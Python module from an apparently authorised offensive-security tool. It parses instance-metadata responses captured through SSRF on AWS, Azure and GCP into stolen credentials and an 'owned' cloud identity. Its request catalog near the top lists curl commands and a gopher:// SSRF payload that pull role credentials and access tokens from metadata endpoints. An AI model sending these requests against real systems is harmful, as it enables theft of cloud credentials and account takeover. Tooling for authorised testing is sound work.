"""The web↔cloud seam: turn a captured **instance-metadata (IMDS) response** into an *owned*
cloud principal for the ``:cloud`` IAM graph.

WHAT THIS IS. A web-side SSRF/RCE primitive that can reach ``169.254.169.254`` (or
``metadata.google.internal``) hands back the instance's temporary role/identity token. This module
takes that **captured response body** — pasted by the operator, pulled from a repeater exchange, or
arriving in an OOB callback body — and extracts the credentials + the identity behind them, then
produces an ``owned`` :class:`~cloudgraph.schema.Node` the privesc walk can start from.

WHAT THIS IS **NOT**. It executes nothing and touches no network. The request that actually hit
IMDS ran through the human-approved repeater / nuclei / executor (or was an OOB callback); this is a
**pure parser** over strings. There is no ``requests``/``urllib``/``subprocess`` here, by design and
by AST test (``test_cloudgraph_safety.py``). It is the cloud parallel to how ``parser.py`` speaks a
tool's wire format and everything downstream speaks the stable schema.

THE SECRET NEVER LEAVES. ``parse`` separates the sensitive material (``creds``) from everything the
UI / finding is allowed to see (``finding_evidence`` carries provider + identity + expiry, never a
key or token). The caller (the ``POST /cockpit/cloud/seed-imds`` route in ``main.py``) stores
``creds`` in the engagement vault / loot and files a Finding built ONLY from the non-secret fields —
mirroring how ``:credentials`` keeps secrets in loot, out of the report body.

COVERAGE. AWS (IMDSv1 and IMDSv2, incl. the token-PUT and role-listing shapes), Azure managed
identity (a JWT), and GCP service-account tokens. Blind-SSRF truncation is expected: a partial body
yields ``warnings`` and whatever could be salvaged, never an exception.
"""

from __future__ import annotations

import base64
import binascii
import json
import re
from dataclasses import dataclass, field
from typing import Any

from .schema import Node

PROVIDERS = ("aws", "azure", "gcp")

# The fixed IMDS request targets, per provider — a catalog the operator copies into the repeater /
# executor and approves-and-sends. Kept CATALOG-FIRST on purpose (memory: "cloud KB grounding
# degrades commands" — an IMDS request is a fixed URL, not something to ground in prose). These are
# TEMPLATES to send through the human-approved executor; this module never fires them.
_CATALOG: dict[str, list[dict[str, str]]] = {
    "aws": [
        {"label": "IMDSv1 — list the instance role name",
         "cmd": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
        {"label": "IMDSv1 — fetch the role's temporary credentials",
         "cmd": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"},
        {"label": "IMDSv2 — step 1: get a session token (needs PUT + a header)",
         "cmd": "curl -s -X PUT http://169.254.169.254/latest/api/token "
                "-H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'"},
        {"label": "IMDSv2 — step 2: use the token to fetch credentials",
         "cmd": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> "
                "-H 'X-aws-ec2-metadata-token: <token>'"},
        {"label": "instance identity — account id + region",
         "cmd": "curl -s http://169.254.169.254/latest/dynamic/instance-identity/document"},
        {"label": "SSRF via gopher (when only a GET primitive exists)",
         "cmd": "gopher://169.254.169.254:80/_GET%20/latest/meta-data/iam/security-credentials/ HTTP/1.1"},
    ],
    "azure": [
        {"label": "managed identity — access token for ARM (needs the Metadata header)",
         "cmd": "curl -s 'http://169.254.169.254/metadata/identity/oauth2/token"
                "?api-version=2018-02-01&resource=https://management.azure.com/' "
                "-H 'Metadata: true'"},
        {"label": "managed identity — token for the Graph / Key Vault audience",
         "cmd": "curl -s 'http://169.254.169.254/metadata/identity/oauth2/token"
                "?api-version=2018-02-01&resource=https://vault.azure.net' -H 'Metadata: true'"},
    ],
    "gcp": [
        {"label": "service account — OAuth access token (needs Metadata-Flavor)",
         "cmd": "curl -s "
                "'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
                "default/token' -H 'Metadata-Flavor: Google'"},
        {"label": "service account — the identity (email)",
         "cmd": "curl -s "
                "'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
                "default/email' -H 'Metadata-Flavor: Google'"},
        {"label": "service account — a signed ID token for an audience",
         "cmd": "curl -s "
                "'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
                "default/identity?audience=https://example.com' -H 'Metadata-Flavor: Google'"},
    ],
}


def request_catalog(provider: str) -> list[dict[str, str]]:
    """The per-provider IMDS request cheat-set the UI shows next to the seed box. Read-only data;
    these are templates for the human-approved executor, never fired here."""
    return list(_CATALOG.get((provider or "").strip().lower(), []))


@dataclass
class SeedResult:
    """The outcome of parsing one captured IMDS body.

    ``node`` is the ``owned`` principal to seed (``None`` when the body carried no credential — a
    role listing or a bare IMDSv2 token, which name the next step but hold no identity to own).
    ``creds`` is the SECRET material — it goes to the vault/loot and NEVER into ``finding_evidence``.
    ``aliases`` are the strings a caller can use to match this identity onto an already-enumerated
    node (ARN, bare role name, SA email, object id), mirroring ``store.mark_owned``'s matching.
    """

    provider: str
    imds_version: str                     # IMDSv1 | IMDSv2 | azure-imds | gcp-metadata | unknown
    identity: str = ""                    # role name / SA email / app object id (display)
    account: str = ""                     # account id / subscription / project, when derivable
    expiration: str = ""                  # ISO timestamp or ttl, "" if unknown
    node: Node | None = None
    creds: dict[str, str] = field(default_factory=dict)      # SECRET — vault/loot only
    aliases: list[str] = field(default_factory=list)
    warnings: list[str] = field(default_factory=list)
    # For the state credential vault (secret held in the gitignored sessions.db, like every cred).
    cred_kind: str = "token"              # token | key
    cred_principal: str = ""
    cred_note: str = ""

    @property
    def has_secret(self) -> bool:
        return any(v for v in self.creds.values())

    @property
    def finding_title(self) -> str:
        return "Cloud credentials captured via SSRF → IMDS"

    @property
    def finding_evidence(self) -> str:
        """Evidence for the Finding — provider, identity, version and expiry ONLY. The secret is
        deliberately absent; it lives in the vault/loot. (Acceptance criterion.)"""
        bits = [f"provider={self.provider}", f"imds={self.imds_version}"]
        if self.identity:
            bits.append(f"identity={self.identity}")
        if self.account:
            bits.append(f"account={self.account}")
        if self.expiration:
            bits.append(f"expires={self.expiration}")
        bits.append("secret captured to loot/vault (not shown)")
        return " · ".join(bits)

    def to_response(self) -> dict[str, Any]:
        """The safe, secret-free view the API returns to the browser."""
        return {
            "provider": self.provider,
            "imds_version": self.imds_version,
            "identity": self.identity,
            "account": self.account,
            "expiration": self.expiration,
            "has_secret": self.has_secret,
            "node": self.node.to_dict() if self.node else None,
            "aliases": self.aliases,
            "warnings": self.warnings,
        }


class ImdsParseError(ValueError):
    """The body was empty or the provider was unrecognised — nothing could be attempted."""


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #
def _load_json(body: str) -> Any | None:
    """Best-effort JSON: tolerate a leading HTTP status line / headers the operator pasted along
    with the body (blind SSRF often returns the whole response). Returns None if nothing parses."""
    body = (body or "").strip()
    if not body:
        return None
    try:
        return json.loads(body)
    except (ValueError, TypeError):
        pass
    # salvage the first {...} or [...] block if headers were pasted in front of it
    m = re.search(r"[{\[].*[}\]]", body, re.DOTALL)
    if m:
        try:
            return json.loads(m.group(0))
        except (ValueError, TypeError):
            return None
    return None


def _b64url_decode(seg: str) -> bytes:
    seg = seg + "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg.encode("ascii"))


def _decode_jwt_payload(token: str) -> dict[str, Any]:
    """Decode (NOT verify) a JWT's payload. Returns {} on anything malformed — a truncated token
    from a blind-SSRF read must not raise."""
    parts = (token or "").split(".")
    if len(parts) < 2:
        return {}
    try:
        payload = _b64url_decode(parts[1])
        data = json.loads(payload.decode("utf-8", "replace"))
        return data if isinstance(data, dict) else {}
    except (ValueError, TypeError, binascii.Error):
        return {}


# --------------------------------------------------------------------------- #
# AWS
# --------------------------------------------------------------------------- #
_AWS_TOKEN_RE = re.compile(r"^[A-Za-z0-9_\-+/=]{20,}$")


def _parse_aws(body: str, role_hint: str) -> SeedResult:
    warnings: list[str] = []
    data = _load_json(body)

    # (a) the credentials GET — the payload we actually want to own.
    if isinstance(data, dict) and ("AccessKeyId" in data or "SecretAccessKey" in data):
        code = str(data.get("Code", "")) or ""
        if code and code != "Success":
            warnings.append(f"IMDS reported Code={code!r} — the credentials may be unusable")
        access_key = str(data.get("AccessKeyId", ""))
        creds = {
            "AccessKeyId": access_key,
            "SecretAccessKey": str(data.get("SecretAccessKey", "")),
            "Token": str(data.get("Token", "")),
        }
        if not creds["SecretAccessKey"]:
            warnings.append("no SecretAccessKey in the body — likely a truncated blind-SSRF read")
        role = (role_hint or "").strip()
        if not role:
            warnings.append(
                "no role name given — pass role_hint (the <role> in the IMDS URL) so the seeded "
                "identity matches the enumerated node; using a placeholder label meanwhile"
            )
            role = "ssrf-imds-role"
        account = _aws_account_from_key(access_key)
        arn = f"arn:aws:iam::{account}:role/{role}" if account else role
        aliases = [a for a in {arn, role, f"role/{role}"} if a]
        node = Node(
            id=arn, type="role", label=arn, provider="aws", owned=True,
            props={"via": "ssrf-imds", "imds_version": _aws_version(body, data),
                   "token_expiry": str(data.get("Expiration", "")), "assumed_role": role},
        )
        return SeedResult(
            provider="aws", imds_version=node.props["imds_version"], identity=role,
            account=account, expiration=str(data.get("Expiration", "")), node=node, creds=creds,
            aliases=aliases, warnings=warnings, cred_kind="token",
            cred_principal=arn, cred_note="AWS temporary role credentials via SSRF/IMDS",
        )

    # (b) the instance-identity document — account id + region context, no secret.
    if isinstance(data, dict) and ("accountId" in data or "region" in data):
        account = str(data.get("accountId", ""))
        warnings.append(
            "this is the instance-identity document (account/region context, no credentials) — "
            "now fetch the role's credentials from .../iam/security-credentials/<role>"
        )
        return SeedResult(provider="aws", imds_version="IMDSv1", account=account,
                          identity=str(data.get("instanceId", "")), warnings=warnings)

    # (c) a bare IMDSv2 session token (the PUT response) — names the next step, holds no identity.
    stripped = (body or "").strip()
    if stripped and "\n" not in stripped and _AWS_TOKEN_RE.match(stripped) and "{" not in stripped:
        warnings.append(
            "this looks like an IMDSv2 session token (the PUT /latest/api/token response) — not "
            "credentials. Now issue GET .../iam/security-credentials/<role> with header "
            "'X-aws-ec2-metadata-token: <token>'."
        )
        return SeedResult(provider="aws", imds_version="IMDSv2", warnings=warnings)

    # (d) the role-name listing (.../security-credentials/) — one or more role names, no secret.
    lines = [ln.strip() for ln in stripped.splitlines() if ln.strip()]
    if lines and all(re.match(r"^[\w+=,.@/-]{1,128}$", ln) for ln in lines) and "{" not in stripped:
        warnings.append(
            f"this is the role listing — {len(lines)} role name(s). Now GET "
            ".../iam/security-credentials/<role> for that role's credentials."
        )
        return SeedResult(provider="aws", imds_version="IMDSv1", identity=lines[0],
                          aliases=lines, warnings=warnings)

    warnings.append("could not recognise this as an AWS IMDS response (creds / identity doc / "
                    "token / role listing) — is the provider or body right?")
    return SeedResult(provider="aws", imds_version="unknown", warnings=warnings)


def _aws_version(body: str, data: dict) -> str:
    """IMDSv2 credentials look identical to v1's; we can only *hint* the version. If the operator
    pasted the token header alongside, call it v2; otherwise report v1 (what a bare GET reaches)."""
    if "x-aws-ec2-metadata-token" in (body or "").lower():
        return "IMDSv2"
    return "IMDSv1"


def _aws_account_from_key(access_key: str) -> str:
    """Best-effort: the 12-digit account id is NOT recoverable from an ``ASIA...`` key without an
    STS call (which this module must never make). Return "" — the caller matches by role name and
    falls back to the account already known from the enumeration graph."""
    return ""


# --------------------------------------------------------------------------- #
# Azure
# --------------------------------------------------------------------------- #
def _parse_azure(body: str, _role_hint: str) -> SeedResult:
    warnings: list[str] = []
    data = _load_json(body)
    if not isinstance(data, dict) or "access_token" not in data:
        warnings.append("no access_token field — an Azure managed-identity response is JSON with "
                        "access_token (remember the 'Metadata: true' header on the request)")
        return SeedResult(provider="azure", imds_version="azure-imds", warnings=warnings)

    token = str(data.get("access_token", ""))
    claims = _decode_jwt_payload(token)
    if not claims:
        warnings.append("could not decode the JWT payload (truncated?) — seeding by token only")
    oid = str(claims.get("oid", ""))
    appid = str(claims.get("appid", "") or claims.get("azp", ""))
    tenant = str(claims.get("tid", ""))
    identity = appid or oid or "managed-identity"
    node_id = oid or appid or "azure-managed-identity"
    label = f"{appid or 'managed-identity'}" + (f" (oid {oid[:8]}…)" if oid else "")
    creds = {"access_token": token}
    aliases = [a for a in {node_id, oid, appid} if a]
    node = Node(
        id=node_id, type="serviceaccount", label=label, provider="azure", owned=True,
        props={"via": "ssrf-imds", "imds_version": "azure-imds", "tenant": tenant,
               "appid": appid, "oid": oid,
               "token_expiry": str(data.get("expires_on", "") or claims.get("exp", ""))},
    )
    return SeedResult(
        provider="azure", imds_version="azure-imds", identity=identity, account=tenant,
        expiration=str(data.get("expires_on", "") or claims.get("exp", "")), node=node,
        creds=creds, aliases=aliases, warnings=warnings, cred_kind="token",
        cred_principal=identity, cred_note="Azure managed-identity access token via SSRF/IMDS",
    )


# --------------------------------------------------------------------------- #
# GCP
# --------------------------------------------------------------------------- #
def _parse_gcp(body: str, _role_hint: str) -> SeedResult:
    warnings: list[str] = []
    data = _load_json(body)

    # the OAuth token response: {access_token, expires_in, token_type}
    if isinstance(data, dict) and "access_token" in data:
        token = str(data.get("access_token", ""))
        expires = data.get("expires_in", "")
        identity = "default"  # the SA email lives at a DIFFERENT endpoint (.../default/email)
        warnings.append(
            "GCP requires the 'Metadata-Flavor: Google' header (blind SSRF that can't set it "
            "reaches nothing). This token names no identity — fetch .../default/email for the SA "
            "and pass it as role_hint to match the enumerated service account."
        )
        node_id = f"serviceaccount:{(_role_hint or 'default').strip()}"
        node = Node(
            id=node_id, type="serviceaccount", label=(_role_hint or "default SA"), provider="gcp",
            owned=True,
            props={"via": "ssrf-imds", "imds_version": "gcp-metadata",
                   "token_expiry": str(expires), "sa_email": (_role_hint or "")},
        )
        aliases = [a for a in {node_id, (_role_hint or "").strip(), "default"} if a]
        return SeedResult(
            provider="gcp", imds_version="gcp-metadata", identity=(_role_hint or "default"),
            expiration=str(expires), node=node, creds={"access_token": token}, aliases=aliases,
            warnings=warnings, cred_kind="token",
            cred_principal=(_role_hint or "default"),
            cred_note="GCP service-account access token via SSRF/IMDS",
        )

    # a bare SA email (.../default/email) — identity context, no secret.
    stripped = (body or "").strip()
    if stripped and "@" in stripped and "\n" not in stripped and "{" not in stripped:
        return SeedResult(provider="gcp", imds_version="gcp-metadata", identity=stripped,
                          aliases=[stripped],
                          warnings=["service-account email (identity, no token) — now fetch "
                                    ".../default/token for the access token"])

    # an ID token (a JWT) from .../default/identity
    if stripped.count(".") == 2 and "{" not in stripped:
        claims = _decode_jwt_payload(stripped)
        email = str(claims.get("email", "")) if claims else ""
        node = Node(
            id=f"serviceaccount:{email or 'default'}", type="serviceaccount",
            label=email or "default SA", provider="gcp", owned=True,
            props={"via": "ssrf-imds", "imds_version": "gcp-metadata", "id_token": True},
        ) if email else None
        return SeedResult(
            provider="gcp", imds_version="gcp-metadata", identity=email,
            node=node, creds={"id_token": stripped} if email else {},
            aliases=[email] if email else [],
            cred_kind="token", cred_principal=email,
            cred_note="GCP service-account ID token via SSRF/IMDS",
            warnings=[] if email else ["decoded a JWT but found no email claim"],
        )

    warnings.append("no access_token / email / identity token recognised — is this a GCP "
                    "metadata response? (needs the Metadata-Flavor: Google header to fetch)")
    return SeedResult(provider="gcp", imds_version="gcp-metadata", warnings=warnings)


# --------------------------------------------------------------------------- #
# public entry
# --------------------------------------------------------------------------- #
_PARSERS = {"aws": _parse_aws, "azure": _parse_azure, "gcp": _parse_gcp}


def parse(response_body: str, provider: str, role_hint: str | None = None) -> SeedResult:
    """Parse a captured IMDS response body for ``provider`` into a :class:`SeedResult`.

    Pure and total: a malformed / truncated body returns a result with ``warnings`` and whatever
    could be salvaged — it never raises for bad content. It DOES raise :class:`ImdsParseError` for
    an empty body or an unknown provider (an operator mistake worth surfacing loudly).
    """
    prov = (provider or "").strip().lower()
    if prov not in _PARSERS:
        raise ImdsParseError(f"unknown provider {provider!r} — one of {PROVIDERS}")
    if not (response_body or "").strip():
        raise ImdsParseError("empty response body — paste the captured IMDS response")
    return _PARSERS[prov](response_body, (role_hint or "").strip())


__all__ = ["parse", "request_catalog", "SeedResult", "ImdsParseError", "PROVIDERS"]
